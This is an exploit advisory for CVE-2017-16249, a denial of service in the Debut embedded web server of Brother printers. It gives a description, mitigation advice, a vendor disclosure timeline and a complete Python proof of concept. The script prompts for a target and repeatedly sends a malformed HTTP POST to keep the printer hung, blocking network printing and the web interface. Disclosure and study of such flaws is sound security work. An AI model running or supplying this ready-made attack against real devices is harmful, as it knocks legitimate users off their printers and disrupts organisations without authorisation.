# Exploit Title: Remote un-authenticated DoS in Debut embedded httpd server in Brother printers
# Date: 11/02/2017
# Exploit Author: z00n (@0xz00n)
# Vendor Homepage: http://www.brother-usa.com
# Version: <= 1.20
# CVE : CVE-2017-16249
#
#Description:
#The Debut embedded http server contains a remotely exploitable denial of service where a single malformed HTTP POST request can cause the server to hang until eventually replying with an HTTP 500 error.  While the server is hung, print jobs over the network are blocked and the web interface is inaccessible. An attacker can continuously send this malformed request to keep the device inaccessible to legitimate traffic.
#
#Remediation Steps:
#No patch currently exists for this issue. To limit exposure, network access to these devices should be limited to authorized personnel through the use of Access Control Lists and proper network segmentation.
#
#Disclosure Attempts:
#09/11/2017 - Attempt to contact vendor
#10/03/2017 - Live chat communications with vendor regarding no reply
#10/25/2017 - Attempt to contact vendor
#11/02/2017 - Advisory published
#
#Proof of Concept:

#!/usr/bin/python
import socket
import sys

target = raw_input("[*] Enter target IP or hostname: ")
port = raw_input("[*] Enter target port: ")

payload = "POST / HTTP/1.1\r\n"
payload += "Host: asdasdasd\r\n"
payload += "User-Agent: asdasdasd\r\n"
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
payload += "Accept-Language: en-US,en;q=0.5\r\n"
payload += "Referer: asdasdasdasd\r\n"
payload += "Connection: close\r\n"
payload += "Upgrade-Insecure-Requests: 1\r\n"
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: 42\r\n"
payload += "asdasdasdasdasdasdasd\r\n\r\n"

print "[*] Starting DOS.  Payload will be sent every time the server responds."
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((target,int(port)))
        print "[*] Sending DOS payload"
        s.send(payload)
        # Wait for server to respond with 500 error
        s.recv(4096)
        s.close()
    except:
        print("[!] Can't connect to target")
        sys.exit()